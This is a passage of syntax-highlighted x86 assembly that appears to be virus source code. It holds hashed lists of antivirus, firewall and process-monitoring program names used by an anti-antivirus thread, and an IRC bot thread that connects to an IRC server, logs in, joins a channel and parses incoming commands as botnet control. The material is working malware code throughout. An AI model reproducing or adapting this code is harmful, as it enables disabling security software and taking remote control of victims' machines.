            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">kv3000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cilin</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">av98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dr.web</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">trojan</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">winrescue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lockdown</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sophos</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">f</span><span class="sc4">-</span><span class="sc5">prot</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">mcafee</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">e</span><span class="sc4">-</span><span class="sc5">scan</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kaspersky</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kav</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wintop</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">apispy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">apimon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sysview</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sysmon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">apithunk</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">procdump</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">av_names_numba</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">av_namez_hashes</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">av_names_numba_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">av_names_length</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">good_namez</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">kernel32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">msgsrv32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mprexe</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mmtask</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mstask</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">explorer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">internat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">taskmon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">systray</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rundll</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">wmiexe</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">winoa386</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">system</span><span class="sc4">|</span><span class="sc5">process</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">system</span><span class="sc4">|</span><span class="sc5">idle</span><span class="sc4">|</span><span class="sc5">process</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">smss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">os2ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">os2srv</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">csrss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">winlogon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">services</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lsass</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">svchost</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">spoolsv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regsvc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ntvdm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">taskmgr</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">nddeagnt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">spoolss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rpcss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tapisrv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rasman</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">good_namez_numba</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">good_namez</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">bad_namez</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">pop3scan</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nod32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nod32cc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">amon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_avp32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_avpcc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">npssvc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nresq32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nsched32</span><span class="sc4">&gt;</span><span class="sc0"> 
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">nschednt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nsplugin</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nav</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navapsvc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navapw32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navlu32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navrunr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navw32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_avpm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">alertsvc</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">avp32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avpcc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avpm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">n32scanw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navwnt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">antivir</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avpupd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avgctrl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avwin95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scan32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vshwin32</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">f</span><span class="sc4">-</span><span class="sc5">stopw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">f</span><span class="sc4">-</span><span class="sc5">prot95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ackwin32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vettray</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vet95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sweep95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pccwin98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">iomon98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avptc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ave32</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">avconsol</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fp</span><span class="sc4">-</span><span class="sc5">win</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dvp95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">f</span><span class="sc4">-</span><span class="sc5">agnt95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">claw95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nvc95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">scan</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lockdown2000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">norton</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">mcafee</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pcciomon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pccmain</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pop3trap</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">webtrap</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avsynmgr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsstat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nmain</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">luall</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lucomserver</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">iamapp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">atrack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nisserv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rescue32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">symproxysvc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nisum</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pview95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">webscanx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">safeweb</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">icmon</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">cfinet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cfinet32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">avp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zonealarm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wink</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zapro</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zatutor</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vmon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zauinst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">minilog</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">lockdown</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ants</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fast</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">guard</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">update</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">autoupdate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">spyxx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">drwatson</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">sfc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">msinfo32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cleaner</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lsetup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">aupdate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lual</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">luinit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navstub</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bootwarn</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">qconsole</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">qserver</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">navdx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">undoboot</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cfgwiz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">moolive</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tca</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tcm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tds</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ss3edit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">anti_trojan</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">atcon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">atupdater</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">atwatch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wgfe95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poproxy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nprotect</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ndd32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mcagent</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mcupdate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">watchdog</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">taumon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">iamaserv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sphinx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsecomr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">icload95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">icsupp95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">icloadnt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">icsuppnt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">frw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">firewall</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">antivirus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">blackice</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">blackd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wrctrl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wradmin</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cleaner3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pcfwallicon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">aplica32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cfiadmin</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">cfiaudit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tds2</span><span class="sc4">-</span><span class="sc2">98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tds2</span><span class="sc4">-</span><span class="sc5">nt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nvarch16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsmain</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">persfw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pavproxy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mssmmc32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">trjscan</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">defwatch</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">vpc42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtvscn95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vptray</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mgui</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">apvxdwin</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsav</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">agentsvr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rrguard</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rescue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rshell</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">apimonitor</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cleanpc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pstat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wintop</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">trojan</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">borg2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">iamserv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsmon</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">bad_namez_numba</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">bad_namez</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">anti_av_thread</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ircbot_thread</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">bdelta</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">X</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">bdelta</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]&gt;</span><span class="sc0">              </span><span class="sc1">; all variables relative to bdelta will be accessed in form of: varname X       </span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0101h</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WSAStartup</span><span class="sc0">
    
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">bot_end</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_LOG</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irclog.log</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc1">; create log file</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
    
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bot_end</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">bot_log_handle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_LOG</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">irc_recv_buffer</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; irc buffer</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">connect_to_irc</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_registry</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bot_end</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">closesocket</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">connect_to_irc_server</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bot_end</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">login_to_irc</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">connect_to_irc</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bot_end</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">join_channel</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bot_end</span><span class="sc0">

</span><span class="sc5">__il</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_line</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bot_end</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">parse_line</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__il</span><span class="sc0">

</span><span class="sc5">bot_end</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc1">;@SEH_RemoveFrame</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_LOG</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">bot_log_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_LOG</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">closesocket</span><span class="sc0">

            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WSACleanup</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">ExitThread</span><span class="sc0">

